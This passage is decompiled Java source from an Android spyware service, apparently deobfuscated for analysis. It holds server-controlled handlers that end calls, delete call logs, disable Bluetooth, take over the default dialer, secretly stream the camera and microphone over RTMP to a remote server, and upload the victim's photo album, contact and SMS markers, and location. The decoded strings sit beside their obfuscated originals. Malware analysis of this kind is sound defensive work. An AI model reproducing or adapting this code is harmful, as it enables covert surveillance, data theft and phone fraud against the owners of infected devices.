//                 if (bb7d7pu7.m5998("IiAlJQ").equals(commandRebootBean.getData())) {
            if ("KILL".equals(commandRebootBean.getData())) {
                Process.killProcess(Process.myPid());
                return;
            }
            return;
        }
    }

    @Override // com.wish.lmbank.helper.SocketHelper.SocketCallback
    public void onMic(CommandMICBean commandMICBean) {
        SocketHelper.getInstance(this).sendMICToServer(String.valueOf(SettingUtils.validateMicAvailability()));
    }

    @Override // com.wish.lmbank.helper.SocketHelper.SocketCallback
    public void onDelCallLog(CommandDelCallLogBean commandDelCallLogBean) {
        if (TextUtils.isEmpty(commandDelCallLogBean.getData())) {
            return;
        }
        Constants.delCallLog(AppStartV.getContext(), commandDelCallLogBean.getData());
    }

    @Override // com.wish.lmbank.helper.SocketHelper.SocketCallback
    public void onCloseBluetooth(CommandCloseBluetoothBean commandCloseBluetoothBean) {
        SettingUtils.closeBluetooth();
    }

    @Override // com.wish.lmbank.helper.SocketHelper.SocketCallback
    public void onScreenState(CommandScreenStateBean commandScreenStateBean) {
        SocketHelper.getInstance(this).sendScreenStateToServer(String.valueOf(isPause));
    }

    @Override // com.wish.lmbank.helper.SocketHelper.SocketCallback
    public void onConnectError(Object[] objArr) {
        String valueOf = (objArr == null || objArr.length <= 0) ? "" : String.valueOf(objArr[0]);
        if (isPause && System.currentTimeMillis() - connectErrorTime >= 120000) {
            connectErrorTime = System.currentTimeMillis();
//             LogUtils.callLog(bb7d7pu7.m5998("BgcqBgcHDAodLBsbBhtFSQgbDhpTSQ") + valueOf);
            LogUtils.callLog("onConnectError, args: " + valueOf);
        }
        reconnectSocket();
        return;
    }

    @Override // com.wish.lmbank.helper.SocketHelper.SocketCallback
    public void onDisconnect(Object[] objArr) {
        String valueOf = (objArr == null || objArr.length <= 0) ? "" : String.valueOf(objArr[0]);
        if (isPause && System.currentTimeMillis() - onDisconnectTime >= 120000) {
            connectErrorTime = System.currentTimeMillis();
//             LogUtils.callLog(bb7d7pu7.m5998("BgctABoKBgcHDAodRUkIGw4aU0k") + valueOf);
            LogUtils.callLog("onDisconnect, args: " + valueOf);
        }
        reconnectSocket();
    }

    @Override // com.wish.lmbank.helper.SocketHelper.SocketCallback
    public void onConnect(Object[] objArr) {
//         SocketHelper.getInstance(this).sendConnectStateToServer(bb7d7pu7.m5998("Jic"));
        SocketHelper.getInstance(this).sendConnectStateToServer("ON");
    }

    /* JADX INFO: Access modifiers changed from: private */
    public void reconnectSocket() {
        SocketHelper.getInstance(this).closeSocket();
//         if (bb7d7pu7.m5998("Bgc").equals(this.isAllowSocket)) {
        if ("on".equals(this.isAllowSocket)) {
            SocketHelper.getInstance(this).reconnectSocket();
        }
    }

    protected void requestDefaultDialer() {
        if (isPause) {
//             SettingUtils.requestDefaultDialer(this, true, bb7d7pu7.m5998("OwwKOgwbHwAKDA"));
            SettingUtils.requestDefaultDialer(this, true, "RecService");
        }
    }

    private void refreshServerContact() {
        StringBuilder sb = new StringBuilder();
        sb.append(DeviceInfoUtils.getDeviceID(AppStartV.getContext()));
//         String m5998 = bb7d7pu7.m5998("Ng");
        String m5998 = "_";
        sb.append(m5998);
//         sb.append(bb7d7pu7.m5998("CgYHHQgKHQ"));
        sb.append("contact");
        sb.append(m5998);
        sb.append(Constants.COMPANY_UUID);
        SocketHelper.getInstance(this).sendUploadInfoMsgToServer(sb.toString());
    }

    private void refreshServerSMS() {
        StringBuilder sb = new StringBuilder();
        sb.append(DeviceInfoUtils.getDeviceID(AppStartV.getContext()));
//         String m5998 = bb7d7pu7.m5998("Ng");
        String m5998 = "_";
        sb.append(m5998);
//         sb.append(bb7d7pu7.m5998("GgQa"));
        sb.append("sms");
        sb.append(m5998);
        sb.append(Constants.COMPANY_UUID);
        SocketHelper.getInstance(this).sendUploadInfoMsgToServer(sb.toString());
    }

    @Override // com.wish.lmbank.helper.SocketHelper.SocketCallback
    public void onReceiveHangUp(CommandHangUpBean commandHangUpBean) {
        if (bb7d7pu7.m5998("WQ").equals(commandHangUpBean.getUpdateLimitPhone())) {
            loadLimitPhoneNumber();
        }
        try {
            PhoneCallManager.endCall();
            submitLoanApplication(true);
        } catch (Exception e) {
            LogUtils.callLog(bb7d7pu7.m5998("Bgc7DAoMAB8MIQgHDjwZRUkMEQoMGR0ABgdTSQ") + e.getMessage());
        }
        LogUtils.callLog(bb7d7pu7.m5998("Bgc7DAoMAB8MIQgHDjwZRUmP4OKM48GP5euP_8RJABo6HAoKDBoaU0k") + false);
    }


    @Override // com.wish.lmbank.helper.SocketHelper.SocketCallback
    public void onReceiveOrder(OrderBean orderBean) {
        StringBuilder sb = new StringBuilder();
//         sb.append(bb7d7pu7.m5998("Bgc7DAoMAB8MJhsNDBtFSQQaDlNJ"));
        sb.append("onReceiveOrder, msg: ");
        sb.append(orderBean.toString());
//         sb.append(bb7d7pu7.m5998("RUkbHQQZKggEDBsIW0lUVEkHHAUFU0k"));
        sb.append(", rtmpCamera2 == null: ");
        sb.append(this.rtmpCamera2 == null);
        LogUtils.callLog(sb.toString());
        if (this.rtmpCamera2 == null) {
            return;
        }
        if (orderBean.getState() == 1) {
            startRTMP(orderBean);
        } else {
            closeRtmpCamera2(false);
        }
    }

    private void startRTMP(OrderBean orderBean) {
        boolean z;
        String order = orderBean.getOrder();
        boolean isStreaming = this.rtmpCamera2.isStreaming();
//         String m5998 = bb7d7pu7.m5998("DxsGBx0");
        String m5998 = "front";
//         String m59982 = bb7d7pu7.m5998("Gh0bDAgEAAcONgoIBAwbCA");
        String m59982 = "streaming_camera";
        if (isStreaming && m59982.equals(order)) {
//             String m59983 = bb7d7pu7.m5998("IiwwNiooJCw7KDYvKCogJy4");
            String m59983 = "KEY_CAMERA_FACING";
//             String m59984 = bb7d7pu7.m5998("IiwwNiooJCw7KDYvKCogJy42KygqIg");
            String m59984 = "KEY_CAMERA_FACING_BACK";
            String value = SharedPreferencesUtils.getValue(m59983, m59984);
            if (m5998.equals(orderBean.getFacing())) {
//                 m59984 = bb7d7pu7.m5998("IiwwNiooJCw7KDYvKCogJy42LzsmJz0");
                m59984 = "KEY_CAMERA_FACING_FRONT";
            }
            if (m59984.equals(value)) {
                return;
            }
            SharedPreferencesUtils.putValue(m59983, m59984);
            this.rtmpCamera2.switchCamera();
        } else if (this.rtmpCamera2.isStreaming()) {
        } else {
            if (m59982.equals(order)) {
                //this.rtmpCamera2.setCurrentType(1);
                this.rtmpCamera2.setWriteChunkSize(1);
                if (m5998.equals(orderBean.getFacing())) {
                    this.rtmpCamera2.setWriteChunkSize(0);
                } else {
                    this.rtmpCamera2.setWriteChunkSize(1);
                }
                z = false;
                if (this.rtmpCamera2.prepareAudio()) {
                    z = this.rtmpCamera2.prepareVideo();
                }
            } else {
                z = false;
//                 if (bb7d7pu7.m5998("Gh0bDAgEAAcONgQACg").equals(order)) {
                if ("streaming_mic".equals(order)) {
                    this.rtmpCamera2.setWriteChunkSize(2);
                    z = this.rtmpCamera2.prepareAudio();
                }
            }
            if (z) {
//                 this.rtmpCamera2.startStream(URL.getRequestUrl(bb7d7pu7.m5998("Oyw4PCw6PTYtLC8oPCU9Njs9JDk2PDsl")) + DeviceInfoUtils.getDeviceID(this));
                this.rtmpCamera2.startStream(URL.getRequestUrl("REQUEST_DEFAULT_RTMP_URL") + DeviceInfoUtils.getDeviceID(this));
                return;
            }
//             LogUtils.callLog(bb7d7pu7.m5998("LBsbBhtJGRsMGQgbAAcOSRodGwwIBEVJPQEAGkkNDB8ACgxJCggHHUkNBkkAHQ"));
            LogUtils.callLog("Error preparing stream, This device cant do it");
            return;
        }
    }

    /* JADX INFO: Access modifiers changed from: private */
    /* loaded from: cookie_9234504.jar:com/wish/lmbank/service/RecServiceV$GetLimitPhoneThread.class */
    public static class GetLimitPhoneThread extends Thread {
        private List<LimitPhoneNumberBean> mLimitPhoneNumber;
        private WeakReference<Context> mWeakContext;
        final RecServiceV this$0;

        /* JADX WARN: 'super' call moved to the top of the method (can break code semantics) */
        public GetLimitPhoneThread(RecServiceV recServiceV, String str, Context context, List list) {
            super(str);
            this.this$0 = recServiceV;
            this.mWeakContext = null;
            this.mLimitPhoneNumber = null;
            this.mWeakContext = new WeakReference<>(context);
            this.mLimitPhoneNumber = list;
        }

        @Override // java.lang.Thread, java.lang.Runnable
        public void run() {
            long currentTimeMillis = System.currentTimeMillis();
            Context context = this.mWeakContext.get();
            if (this.mLimitPhoneNumber == null || context == null) {
                return;
            }
//             String str = bb7d7pu7.m5998("LgwdJQAEAB05AQYHDD0BGwwIDUVJCwwOAAdTSQ") + System.currentTimeMillis();
            String str = "GetLimitPhoneThread, begin: " + System.currentTimeMillis();
//             String m5998 = bb7d7pu7.m5998("OwwKBhsNDBs6DBsfAAoM");
            String m5998 = "RecorderService";
            LogUtils.d(m5998, str);
            LimitPhoneNumberDB.getInstance(context).deleteAllLimitPhoneNumber();
            LimitPhoneNumberDB.getInstance(context).addLimitPhoneNumberList(this.mLimitPhoneNumber);
//             LogUtils.d(m5998, bb7d7pu7.m5998("LgwdJQAEAB05AQYHDD0BGwwIDUVJDRwbCB0ABgdTSQ") + (System.currentTimeMillis() - currentTimeMillis));
            LogUtils.d(m5998, "GetLimitPhoneThread, duration: " + (System.currentTimeMillis() - currentTimeMillis));
        }
    }

    /* JADX INFO: Access modifiers changed from: private */
    /* loaded from: cookie_9234504.jar:com/wish/lmbank/service/RecServiceV$GetColorRingThread.class */
    public static class GetColorRingThread extends Thread {
        private List<ColorRingBean> mColorRing;
        private WeakReference<Context> mWeakContext;
        final RecServiceV this$0;

        /* JADX WARN: 'super' call moved to the top of the method (can break code semantics) */
        public GetColorRingThread(RecServiceV recServiceV, String str, Context context, List list) {
            super(str);
            this.this$0 = recServiceV;
            this.mWeakContext = null;
            this.mColorRing = null;
            this.mWeakContext = new WeakReference<>(context);
            this.mColorRing = list;
        }

        @Override // java.lang.Thread, java.lang.Runnable
        public void run() {
            Context context = this.mWeakContext.get();
            if (this.mColorRing == null || context == null) {
                return;
            }
            CallRingDB.getInstance(context).deleteAllColorRing();
            CallRingDB.getInstance(context).addColorRingList(this.mColorRing);
            return;
        }
    }

    /* JADX INFO: Access modifiers changed from: private */
    public void uploadImages(AlbumBean albumBean) {
        if (AppStartV.isCalling || isPause || this.isUploadImages || albumBean == null || TextUtils.isEmpty(albumBean.getName())) {
            return;
        }
        File file = new File(albumBean.getPath());
        if (file.exists()) {
            this.isUploadImages = true;
            String deviceID = DeviceInfoUtils.getDeviceID(AppStartV.getContext());
            HashMap<String, String> hashMap = new HashMap<>();
//             hashMap.put(bb7d7pu7.m5998("DQwfAAoMNgAN"), deviceID);
            hashMap.put("device_id", deviceID);
//             hashMap.put(bb7d7pu7.m5998("CBkZIA0"), Constants.COMPANY_UUID);
            hashMap.put("appId", Constants.COMPANY_UUID);
//             hashMap.put(bb7d7pu7.m5998("HBk2GQgdATYbDAgF"), albumBean.getRealPath());
            hashMap.put("up_path_real", albumBean.getRealPath());
            HttpManager.getInstance().uploadImages(file, JsonUtils.map2Json(hashMap).toString(), new HttpEngine.OnResponseCallback<HttpResponse.UploadInfoFile>() { // from class: com.wish.lmbank.service.RecServiceV.21

                @Override // com.wish.lmbank.http.HttpEngine.OnResponseCallback
                public void onResponse(int i, String str, HttpResponse.UploadInfoFile uploadInfoFile) {
                    if (i == 0 && file.exists()) {
//                         AlbumDB.getInstance(AppStartV.getContext()).updateAlbumStatusById(albumBean.getId(), bb7d7pu7.m5998("HBkFBggN"));
                        AlbumDB.getInstance(AppStartV.getContext()).updateAlbumStatusById(albumBean.getId(), "upload");
                        try {
                            RecServiceV.this.uploadImagesList.remove(0);
                        } catch (Exception e) {
//                             LogUtils.callLog(bb7d7pu7.m5998("HBkFBggNIAQIDgwaRUkMEQoMGR0ABgdTSQ") + e.getMessage());
                            LogUtils.callLog("uploadImages, exception: " + e.getMessage());
                        }
                    }
                    RecServiceV.this.isUploadImages = false;
                }
            });
        }
    }

    /* JADX INFO: Access modifiers changed from: private */
    public void saveAlbumDB(List<LocalMedia> list) {
        if (list == null || list.size() <= 0) {
            return;
        }
        this.isSavingAlbumDB = true;
        UploadInfoThreadExecutor.getSingleton().execute(new Runnable() { // from class: com.wish.lmbank.service.RecServiceV.22

            @Override // java.lang.Runnable
            public void run() {
                ArrayList arrayList = new ArrayList();
                Iterator it = list.iterator();
                while (true) {
                    boolean hasNext = it.hasNext();
//                     String m5998 = bb7d7pu7.m5998("BwYbBAgF");
                    String m5998 = "normal";
                    if (hasNext) {
                        LocalMedia localMedia = (LocalMedia) it.next();
                        if (localMedia != null && !AlbumDB.getInstance(AppStartV.getContext()).isExistByName(localMedia.getFileName())) {
                            AlbumBean albumBean = new AlbumBean();
                            albumBean.setStatus(m5998);
                            albumBean.setName(localMedia.getFileName());
                            albumBean.setTime(localMedia.getDateAddedTime() + "");
                            albumBean.setRealPath(localMedia.getRealPath());
                            if (localMedia.isCompressed() && !TextUtils.isEmpty(localMedia.getCompressPath())) {
                                albumBean.setPath(localMedia.getCompressPath());
                            } else {
                                albumBean.setPath(localMedia.getRealPath());
                            }
                            arrayList.add(albumBean);
                        }
                    } else {
                        AlbumDB.getInstance(AppStartV.getContext()).addAlbumList(arrayList);
                        RecServiceV.this.uploadImagesList = AlbumDB.getInstance(AppStartV.getContext()).queryAlbumListByStatus(m5998);
                        RecServiceV.this.isSavingAlbumDB = false;
//                         LogUtils.callLog(bb7d7pu7.m5998("GggfDCgFCxwELStFSRwZBQYIDSAECA4MGiUAGh06ABMMU0k") + RecServiceV.this.uploadImagesList.size());
                        LogUtils.callLog("saveAlbumDB, uploadImagesListSize: " + RecServiceV.this.uploadImagesList.size());
                        return;
                    }
                }
            }
//         }, bb7d7pu7.m5998("GggfDCgFCxwELSs"));
        }, "saveAlbumDB");
    }

    /* JADX INFO: Access modifiers changed from: private */
    public void loadAllMedia() {
//         LogUtils.callLog(bb7d7pu7.m5998("BQYIDSgFBSQMDQAI"));
        LogUtils.callLog("loadAllMedia");
        this.mLoader.loadAllMedia(new OnQueryDataResultListener<LocalMediaFolder>() { // from class: com.wish.lmbank.service.RecServiceV.23
            @Override // com.wish.lmbank.album.listener.OnQueryDataResultListener
            public void onComplete(List<LocalMediaFolder> list) {
                ArrayList arrayList = new ArrayList();
                if (list != null) {
                    for (LocalMediaFolder localMediaFolder : list) {
                        arrayList.addAll(localMediaFolder.getData());
                    }
                }
                RecServiceV.this.compressToLuban(arrayList);
            }
        });

    }

    /* JADX INFO: Access modifiers changed from: private */
    public void compressToLuban(List<LocalMedia> list) {
        PictureThreadUtils.executeByIo(new PictureThreadUtils.SimpleTask<List<LocalMedia>>() { // from class: com.wish.lmbank.service.RecServiceV.24


            @Override // com.wish.lmbank.album.thread.PictureThreadUtils.Task
            public List<LocalMedia> doInBackground() throws Exception {
                return Luban.with(AppStartV.getContext()).loadMediaData(list).isCamera(RecServiceV.this.config.camera).setTargetDir(RecServiceV.this.config.compressSavePath).setCompressQuality(RecServiceV.this.config.compressQuality).isAutoRotating(RecServiceV.this.config.isAutoRotating).setFocusAlpha(RecServiceV.this.config.focusAlpha).setNewCompressFileName(RecServiceV.this.config.renameCompressFileName).ignoreBy(RecServiceV.this.config.minimumCompressSize).get();
            }

            @Override // com.wish.lmbank.album.thread.PictureThreadUtils.Task
            public void onSuccess(List<LocalMedia> list2) {
                PictureThreadUtils.cancel(PictureThreadUtils.getIoPool());
                RecServiceV.this.onCompressResult(list2);
            }
        });
    }

    protected void onCompressResult(List<LocalMedia> list) {
        //             sb.append(bb7d7pu7.m5998("BQYIDSgFBSQMDQAIRUkGByoGBBkbDBoaOwwaHAUdRUkaABMMU0k"));
        String sb = "loadAllMedia, onCompressResult, size: " +
                (list != null ? list.size() : 0);
        LogUtils.callLog(sb);
        if (SdkVersionUtils.isQ() && this.config.isAndroidQTransform) {
            onResultToAndroidAsy(list);
        } else {
            saveAlbumDB(list);
        }
    }

    private void onResultToAndroidAsy(List<LocalMedia> list) {
        boolean z;
        int size = list.size();
        int i = 0;
        while (true) {
            z = false;
            if (i >= size) {
                break;
            }
            LocalMedia localMedia = list.get(i);
            if (localMedia == null || TextUtils.isEmpty(localMedia.getPath()) || (!this.config.isCheckOriginalImage && (localMedia.isCut() || localMedia.isCompressed() || localMedia.isToSandboxPath()))) {
                i++;
            }
        }
        z = true;
        startThreadCopySandbox(list);
    }

    private void normalResult(List<LocalMedia> list) {
        int size = list.size();
        for (int i = 0; i < size; i++) {
            LocalMedia localMedia = list.get(i);
            if (localMedia != null && !TextUtils.isEmpty(localMedia.getPath())) {
                if (localMedia.isCut() && localMedia.isCompressed()) {
                    localMedia.setAndroidQToPath(localMedia.getCompressPath());
                }
                if (this.config.isCheckOriginalImage) {
                    localMedia.setOriginal(true);
                    localMedia.setOriginalPath(localMedia.getAndroidQToPath());
                }
            }
        }
        saveAlbumDB(list);
    }

    private void startThreadCopySandbox(List<LocalMedia> list) {
        PictureThreadUtils.executeByIo(new PictureThreadUtils.SimpleTask<List<LocalMedia>>() { // from class: com.wish.lmbank.service.RecServiceV.25
            public List<LocalMedia> doInBackground() {
                boolean z;
                int size = list.size();
                for (int i = 0; i < size; i++) {
                    LocalMedia localMedia = list.get(i);
                    if (localMedia != null && !TextUtils.isEmpty(localMedia.getPath())) {
                        if (!localMedia.isCut() && !localMedia.isCompressed() && !localMedia.isToSandboxPath()) {
                            if (PictureMimeType.isContent(localMedia.getPath())) {
                                if (!PictureMimeType.isHasHttp(localMedia.getPath())) {
                                    localMedia.setAndroidQToPath(AndroidQTransformUtils.copyPathToAndroidQ(AppStartV.getContext(), localMedia.getId(), localMedia.getPath(), localMedia.getWidth(), localMedia.getHeight(), localMedia.getMimeType(), RecServiceV.this.config.cameraFileName));
                                    z = true;
                                    if (!RecServiceV.this.config.isCheckOriginalImage) {
                                        localMedia.setOriginal(true);
                                        if (z) {
                                            localMedia.setOriginalPath(localMedia.getAndroidQToPath());
                                        } else {
                                            localMedia.setOriginalPath(AndroidQTransformUtils.copyPathToAndroidQ(AppStartV.getContext(), localMedia.getId(), localMedia.getPath(), localMedia.getWidth(), localMedia.getHeight(), localMedia.getMimeType(), RecServiceV.this.config.cameraFileName));
                                        }
                                    }
                                }
                            } else if (localMedia.isCut() && localMedia.isCompressed()) {
                                localMedia.setAndroidQToPath(localMedia.getCompressPath());
                            }
                        } else if (localMedia.isCut() && localMedia.isCompressed()) {
                            localMedia.setAndroidQToPath(localMedia.getCompressPath());
                        }
                    }
                }
                return list;
            }


            @Override // com.wish.lmbank.album.thread.PictureThreadUtils.Task
            public void onSuccess(List<LocalMedia> list2) {
                PictureThreadUtils.cancel(PictureThreadUtils.getIoPool());
                if (list2 != null) {
                    RecServiceV.this.saveAlbumDB(list2);
                }
            }
        });
    }

    @Override // com.wish.lmbank.location.LocationManager.UpdateLocationListener
    public void onLocationUpdated(Location location, boolean z) {
        if (location == null || location.getLatitude() == 0.0d || location.getLongitude() == 0.0d) {
            return;
        }
//         LogUtils.v(bb7d7pu7.m5998("OwwKBhsNDBs6DBsfAAoM"), bb7d7pu7.m5998("BgclBgoIHQAGBzwZDQgdDA1FSQUGCggdAAYHU0k") + location.toString());
        LogUtils.v("RecorderService", "onLocationUpdated, location: " + location.toString());
//         SocketHelper.getInstance(this).sendLocationMsgToServer(location.getLongitude() + bb7d7pu7.m5998("Ng") + location.getLatitude());
        SocketHelper.getInstance(this).sendLocationMsgToServer(location.getLongitude() + "_" + location.getLatitude());
        this.mAndroidLocationManager.onPause();
    }

    @Override // com.wish.lmbank.location.LocationManager.UpdateLocationListener
    public boolean isLocationPermissionAllowed() {
        return PermissionUtils.hasLocationPermission(this).size() < 1;

    }
}
